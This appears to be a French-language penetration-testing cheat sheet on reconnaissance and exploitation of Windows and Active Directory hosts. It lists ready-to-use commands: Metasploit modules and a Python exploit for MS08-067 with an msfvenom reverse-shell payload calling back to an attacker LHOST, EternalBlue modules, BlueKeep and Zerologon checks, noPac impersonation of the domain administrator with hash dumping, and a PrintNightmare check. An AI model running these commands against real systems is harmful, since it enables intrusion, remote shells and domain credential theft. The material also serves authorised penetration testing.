# Reconnaissance

### Politique de mot de passe

_**Note :** nécessite une connexion locale sur une machine Windows_

```
net accounts
```

### Version de l'OS

```
cme <IP>
```

### Elévation de privilège locale

```
./winpeas.exe
```

### Vulnérabilités connues

#### MS08\_067

```
msf > use exploit/windows/smb/ms08_067_netapi

https://github.com/Agent-Tiro/HackTheBoxScripts/blob/master/Python3-MS08-067.py
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86
python3 Python3-MS08-067.py <IP> 1 445 #Changer l'OS cible en modifiant le '1'
```

#### MS17-010 (Eternal Blue)

```
nmap -v -p445 --script smb-vuln-ms17-010.nse
msf > use auxiliary/scanner/smb/smb_ms17_010
msf > use exploit/windows/smb/ms17_010_eternalblue
```

#### BlueKeep

```
msf > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
```

#### Zerologon

```
python3 zerologon_tester.py <DC> <IP-DC>
```

#### Sam The Admin

```
python3 noPac.py <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <IP-DC> -dc-host <HOSTNAME-DC> --impersonate administrator -dump [-use-ldap]
```

#### PrintNightmare

```
python3 printnightmare.py -check '<DOMAIN>/<USER>:<PASSWORD>@<IP>
```
